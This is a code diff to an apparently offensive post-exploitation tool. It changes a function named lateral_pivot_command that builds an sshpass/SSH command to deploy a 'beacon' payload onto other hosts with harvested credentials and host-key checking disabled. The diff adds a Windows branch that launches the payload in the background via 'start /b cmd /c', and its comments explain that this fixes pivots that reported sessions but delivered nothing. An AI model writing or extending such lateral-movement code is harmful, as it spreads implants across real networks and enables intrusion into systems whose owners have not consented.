@@ -23,8 +23,23 @@ _IS_NTLM = re.compile(r"^[0-9a-fA-F]{32}$")
 
 
 def lateral_pivot_command(host: str, username: str, password: str,
-                          payload: str) -> str:
-    """Cross-host beacon deploy over SSH (the universal fallback)."""
+                          payload: str, os_name: str = "") -> str:
+    """Cross-host beacon deploy over SSH — on EVERY family that speaks it.
+
+    SSH is not "the unix one": OpenSSH ships with Windows Server 2019+ (and
+    is enabled on plenty of workstations), macOS, and most appliances. What
+    differs is the REMOTE SHELL, not the transport: sshd on Windows runs
+    ``cmd.exe`` by default, where ``nohup ... &`` is a syntax error — the
+    pivot reported a session and delivered nothing. ``os_name`` picks the
+    launcher; an unknown peer keeps the POSIX form it has always had.
+    """
+    if "windows" in (os_name or "").lower():
+        # `start /b` is cmd's "launch and return", so sshd does not sit on
+        # the session waiting for the beacon to exit.
+        return (f"sshpass -p {password} ssh -o StrictHostKeyChecking=no "
+                f"-o ConnectTimeout=8 {username}@{host} "
+                f"\"start /b cmd /c {payload}\" && "
+                f"echo PIVOT_OK host={host}")
     return (f"sshpass -p {password} ssh -o StrictHostKeyChecking=no "
             f"-o ConnectTimeout=8 {username}@{host} "
             f"\"nohup {payload} >/dev/null 2>&1 &\" && "
